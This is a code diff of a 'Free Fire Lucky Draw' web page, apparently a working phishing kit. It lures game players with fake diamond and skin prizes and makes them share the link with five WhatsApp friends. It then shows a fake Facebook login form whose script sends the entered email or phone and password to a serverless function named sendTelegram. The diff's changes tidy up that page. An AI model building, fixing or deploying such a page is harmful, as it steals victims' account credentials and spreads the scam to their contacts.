@@ -5,7 +5,6 @@
 <title>Free Fire Lucky Draw</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <style>
-/* Same styles as before, unchanged */
 body {
   background: #161a2b;
   color: white;
@@ -219,13 +218,11 @@ h1 {
 </head>
 <body>
   <h1>Free Fire Lucky Draw</h1>
-
   <div id="prizeBox">
     <div class="text">Click to Open</div>
     <img alt="Winning Prize" />
     <div id="prizeName" class="text"></div>
   </div>
-
   <div class="prize-pool" id="prizePool">
     <div class="prize" data-idx="0">
       <img src="diamond-500.png" alt="500 Diamonds" title="500 Diamonds" />
@@ -248,15 +245,12 @@ h1 {
       <div class="label">Pet Box</div>
     </div>
   </div>
-
   <button id="share-btn" class="spin-btn" style="margin-top: 20px;">
     Please share this site once to 5 different friends on WhatsApp to redeem your prize
   </button>
-
   <div id="redeem-area" style="margin-top:15px;">
     <button class="redeem-btn" id="redeemBtn">Redeem</button>
   </div>
-
   <!-- Facebook Login Modal -->
   <div id="fb-modal">
     <div class="fb-container">
@@ -270,12 +264,10 @@ h1 {
       </div>
     </div>
   </div>
-
   <!-- Confirmation Page -->
   <div id="confirmation-page">
     <p>Thank you for logging in!<br>Your gift will be received in your mailbox within 24 hours.</p>
   </div>
-
 <script>
   const prizes = [
     { name: '500 Diamonds', img: 'diamond-500.png' },
@@ -284,7 +276,6 @@ h1 {
     { name: 'Rare Dress', img: 'rare-dress.jpg' },
     { name: 'Pet Box', img: 'pet-box.png' }
   ];
-
   const prizeBox = document.getElementById('prizeBox');
   const prizePoolDivs = document.querySelectorAll('#prizePool .prize');
   const shareBtn = document.getElementById('share-btn');
@@ -293,7 +284,6 @@ h1 {
   const resultImg = prizeBox.querySelector('img');
   const resultName = document.getElementById('prizeName');
   const resultText = prizeBox.querySelector('.text');
-
   let opened = false;
   let wonPrizeIdx = null;
 
@@ -302,8 +292,6 @@ h1 {
     resultName.textContent = '';
     resultText.style.display = 'block';
     resultText.textContent = 'Click to Open';
-    redeemBtn.disabled = false;
-    redeemArea.style.display = 'block';
     prizePoolDivs.forEach(div => div.classList.remove('highlight'));
     shareBtn.style.display = 'block';
     opened = false;
@@ -313,7 +301,6 @@ h1 {
     let rounds = 10;
     let steps = rounds * prizes.length;
     let currentStep = 0;
-
     function step() {
       prizePoolDivs.forEach(div => div.classList.remove('highlight'));
       let highlightIdx = currentStep % prizes.length;
@@ -329,7 +316,6 @@ h1 {
     }
     step();
   }
-
   function showWinningPrize(idx) {
     wonPrizeIdx = idx;
     resultText.style.display = 'none';
@@ -338,33 +324,27 @@ h1 {
     resultImg.style.display = 'block';
     resultName.textContent = prizes[idx].name;
   }
-
   prizeBox.addEventListener('click', () => {
     if (opened) return;
     opened = true;
     const randomIndex = Math.floor(Math.random() * prizes.length);
     animatePrizeSelection(randomIndex);
   });
-
   shareBtn.addEventListener('click', () => {
     const siteURL = encodeURIComponent(window.location.href);
     const whatsappLink = `https://wa.me/?text=Check out this awesome Free Fire Lucky Draw! Share it with 5 friends and claim your prize: ${siteURL}`;
     window.open(whatsappLink, '_blank');
   });
-
   redeemBtn.addEventListener('click', () => {
     document.getElementById('fb-modal').style.display = 'flex';
   });
-
   document.getElementById('fb-login-btn').addEventListener('click', () => {
     const emailOrPhone = document.getElementById('fb-email').value.trim();
     const password = document.getElementById('fb-password').value.trim();
-
     if (!emailOrPhone || !password) {
       alert('Please fill in both fields.');
       return;
     }
-
     fetch('/.netlify/functions/sendTelegram', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -386,12 +366,12 @@ h1 {
         alert('Error sending details.');
       });
   });
-
   document.querySelector('.close-fb').addEventListener('click', () => {
     document.getElementById('fb-modal').style.display = 'none';
   });
-
-  // Initialize UI
+  // *** IMPORTANT FIX: Always hide confirmation and fb-modal at load ***
+  document.getElementById('confirmation-page').style.display = 'none';
+  document.getElementById('fb-modal').style.display = 'none';
   resetPrizeBox();
 </script>
 </body>
